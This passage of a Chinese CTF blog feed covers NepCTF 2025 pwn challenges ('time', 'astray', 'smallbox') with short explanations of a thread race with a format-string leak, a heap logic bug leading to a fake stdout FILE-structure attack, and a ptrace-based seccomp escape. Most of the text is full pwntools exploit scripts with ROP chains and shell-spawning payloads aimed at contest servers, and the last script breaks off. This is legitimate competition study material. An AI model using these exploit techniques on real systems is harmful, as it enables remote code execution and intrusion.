class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./canutrytry&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nepctf30-re0p-1yod-ovkd-tywcgo6zc386.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">visit_2(<span class="number">0x38</span>)</span><br><span class="line">visit_1()</span><br><span class="line">visit_2(-<span class="number">1</span>)</span><br><span class="line">visit_1()</span><br><span class="line">ru(<span class="string">b&#x27;setbufaddr:0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x87fe0</span>-<span class="number">0x80</span></span><br><span class="line">ru(<span class="string">b&#x27;stackaddr:0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x405460</span>)+p64(<span class="number">0x401ed9</span>)</span><br><span class="line"></span><br><span class="line">rdi=li(<span class="number">0x000000000002a3e5</span>)</span><br><span class="line">rsi=li(<span class="number">0x000000000002be51</span>)</span><br><span class="line">rdx_r12=li(<span class="number">0x000000000011f497</span>)</span><br><span class="line">write=lis(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">visit_3(<span class="number">0</span>,payload)</span><br><span class="line">leave(<span class="number">0</span>)</span><br><span class="line">payload=p64(rdi)+p64(<span class="number">2</span>)+p64(rsi)+p64(<span class="number">0x4053c0</span>)+p64(rdx_r12)+p64(<span class="number">0x64</span>)+p64(<span class="number">0</span>)+p64(write)</span><br><span class="line">sla(<span class="string">b&#x27;well,prepare your rop now!\n&#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">b&#x27;Enter your flag: &#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x405458</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">s(payload)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> c++异常处理，如何更换依赖库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nepnep2025-CTF-pwn</title>
      <link href="/2025/07/30/Nepnep2025-CTF-pwn/"/>
      <url>/2025/07/30/Nepnep2025-CTF-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="Nepnep-CTF-pwn"><a href="#Nepnep-CTF-pwn" class="headerlink" title="Nepnep-CTF-pwn"></a>Nepnep-CTF-pwn</h1><p>打了一下nep的比赛，由于个人原因，做了time和astray后就没再做了，估摸着smallbox也能出来吧，总得来说体验还是不错的，赛后复现也学到了新东西hhh，我写的wp很草率，大家可以看看别人的，不要学我这么懒噢~~，<a href="https://www.cnblogs.com/xmiscx/p/19010430#_label0">链接1</a>，<a href="https://bbs.kanxue.com/thread-287806.htm">链接2</a></p><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><p>第一次调试多进程和多线程的题，也是边调边学，这个题的考点是线程竞争，两个线程 共用一个内存地址，可以读写数据，第一次输入 file 文件名的时候随便输入一个绕过检测开启第二个线程，然后第一个线程会继续运行让你继续输入 file 文件名，这时候输入 flag ，就 可以修改内存中的数据，导致第二个进程 open(flag)（因为第二个线程运行的内容多，运行的比较慢），然后利用 fmt 泄露就可以了，但是不知道为啥，这个题%s 不行，非得用%p 泄 露，%s 卡了我很久很久，真的我哭死</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./time&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nepctf32-4zsf-cgu6-xip5-dqatwcf4l596.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;please input your name:\n&#x27;</span>,<span class="string">b&quot;%22$p%23$p%24$p%25$p%26$p%27$p%28$p%29$p&quot;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;input file name you want to read:\n&#x27;</span>,<span class="string">b&#x27;aa\nflag&#x27;</span>)</span><br><span class="line">shell()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="astray"><a href="#astray" class="headerlink" title="astray"></a>astray</h2><p>这个堆题还是蛮有意思的</p><p>这里把大小为 0x2000 的 chunk 称为 chunk1 ，用来填写 user 操作的 0x18 的 chunk 记为 chunk2 ，把 manager 操作的 0x18 的 chunk 记为 chunk3</p><p>首先可以登录 manager ，然后 read 的 index 为 0 ，便可以泄露出 heap 和 pie ，然后利用 逻辑漏洞可以把 user 的操作地址改为 index 为 0 的块，（但是代码想体现的逻辑是 manager 能操作 index 为 1~19，user 能操作 index 为 10~ 19，这就已经是违法的了），然后利用 manager 对 user 的 visit 操作，可以修改 index 为 0 块的内容，但是这个地方记录了 manager 和 user 执行操作的指针索引值，到这里，这道题的漏洞利用完成，已经可以实现很多事情了，我的 exp 是泄露 libc ，然后打 stdout 结构体，在 puts 调用的时候就可以 get_shell 了</p><p>噢对，看了一眼别人的exp，也可以利用environ打栈然后rop，也很有意思</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manwrite</span>(<span class="params">index,concent</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;visit user(MANAGER_visit)\n&#x27;</span>,<span class="string">b&#x27;MANAGER_write&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;1-19: manager can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    pause()</span><br><span class="line">    s(concent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manread</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;visit user(MANAGER_visit)\n&#x27;</span>,<span class="string">b&#x27;MANAGER_read&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;1-19: manager can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visitr</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;visit user(MANAGER_visit)\n&#x27;</span>,<span class="string">b&#x27;MANAGER_visit&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;1-19: manager can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;2: manager visit user to write to user_logs\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visitw</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;visit user(MANAGER_visit)\n&#x27;</span>,<span class="string">b&#x27;MANAGER_visit&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;1-19: manager can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;2: manager visit user to write to user_logs\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">userr</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;user write to logs(USER_write)\n&#x27;</span>,<span class="string">b&#x27;USER_read&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;10-19: user can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">userw</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;user write to logs(USER_write)\n&#x27;</span>,<span class="string">b&#x27;USER_write&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;10-19: user can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    pause()</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;user write to logs(USER_write)\n&#x27;</span>,<span class="string">b&#x27;MANAGER_visit&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;10-19: user can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./astray&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./astray&quot;])</span></span><br><span class="line">p = remote(<span class="string">&quot;nepctf32-unsz-rtgi-s43y-ymc9bujpw004.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">manread(<span class="number">0</span>)</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">heap_base=uu64()-<span class="number">0x22d0</span></span><br><span class="line">r(<span class="number">2</span>)</span><br><span class="line">pie=uu64()-<span class="number">0x41a0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line">manwrite(<span class="number">2</span>,p64(he(<span class="number">0x4a0</span>+<span class="number">8</span>))+p64(pie+<span class="number">0x4040</span>))</span><br><span class="line">attack(<span class="number">0</span>)</span><br><span class="line">visitw(<span class="number">1</span>,p64(<span class="number">1</span>)+p64(he(<span class="number">0x22d0</span>))+p64(he(<span class="number">0x4a0</span>-<span class="number">0x8</span>)))</span><br><span class="line">visitr(<span class="number">3</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x21b6a0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ogg1=li(<span class="number">0xebc81</span>)</span><br><span class="line">ogg2=li(<span class="number">0xebc85</span>)</span><br><span class="line">ogg3=li(<span class="number">0xebc88</span>)</span><br><span class="line">ogg4=li(<span class="number">0xebce2</span>)</span><br><span class="line">ogg5=li(<span class="number">0xebd38</span>)</span><br><span class="line">ogg6=li(<span class="number">0xebd3f</span>)</span><br><span class="line">ogg7=li(<span class="number">0xebd43</span>)</span><br><span class="line">stdout=lis(<span class="string">&quot;_IO_2_1_stdout_&quot;</span>)</span><br><span class="line">IO_wfile_jumps=libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">setcontext_61=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">system,binsh=getshell()</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x20</span>:p64(<span class="number">1</span>),</span><br><span class="line">        <span class="number">0x18</span>:p64(<span class="number">0</span>),</span><br><span class="line">        <span class="number">0xe0</span>:p64(he(<span class="number">0x9a0</span>+<span class="number">0x50</span>)),</span><br><span class="line">        (<span class="number">0x50</span>+<span class="number">0x18</span>):p64(system),</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line">manwrite(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">visitw(<span class="number">1</span>,p64(li(<span class="number">0x21b6a0</span>))+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdout)+p64(<span class="number">3</span>))</span><br><span class="line">pay=flat(</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x0</span>:[<span class="string">b&#x27;/bin/sh\x00&#x27;</span>],     <span class="comment"># rdi=binsh</span></span><br><span class="line"><span class="number">0x20</span>:[p64(<span class="number">0</span>)],            <span class="comment"># write_base</span></span><br><span class="line"><span class="number">0x28</span>:[p64(<span class="number">1</span>)],            <span class="comment"># write_ptr --&gt; ptr &gt; base</span></span><br><span class="line"><span class="number">0xc0</span>:[p64(<span class="number">0</span>)],            <span class="comment"># _mode &lt;= 0</span></span><br><span class="line"><span class="number">0xd8</span>:[p64(IO_wfile_jumps+<span class="number">0x10</span>)],<span class="comment">#vatble</span></span><br><span class="line"><span class="number">0x88</span>:[p64(he(<span class="number">0x600</span>)+<span class="number">0x90</span>)],   <span class="comment"># bypass lock</span></span><br><span class="line"><span class="number">0xa0</span>:[p64(he(<span class="number">0x9a0</span>))]    <span class="comment">#fake wide_data    p-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span></span><br><span class="line">&#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">userw(<span class="number">0</span>,pay)</span><br><span class="line">shell()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="smallbox"><a href="#smallbox" class="headerlink" title="smallbox"></a>smallbox</h2><p>这个题只允许了ptrace系统调用，思路很明确，放个网站，exp基本直接照抄就好了，<a href="https://skyeto.com/p/seccomp-jail-escape-using-ptrace">点这里</a></p><p>这里简单说一下思路</p><p>1.attach到子进程，让子进程暂停</p><p>2.将子进程的寄存器状态写到父进程的栈上，泄露出来</p><p>3.将要让子进程执行的shellcode用ptarce系统调用每次4个字节写到子进程的内存里，也就是rip指向的内存（子进程rip的值已经在上一步泄露出来了）</p><p>4.让父进程脱离对子进程的控制</p><p>5.让父进程进入无限循环，让子进程执行shellcoed获得shell</p><p><strong>注意</strong> 要让子进程先执行一下，而且不太稳定，建议连接后稍等一会儿再输入命令</p><p><strong>疑问</strong> 不理解为什么写入子进程的shellcode的前后必须要有nop，貌似没有nop就会失败，很奇怪</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span 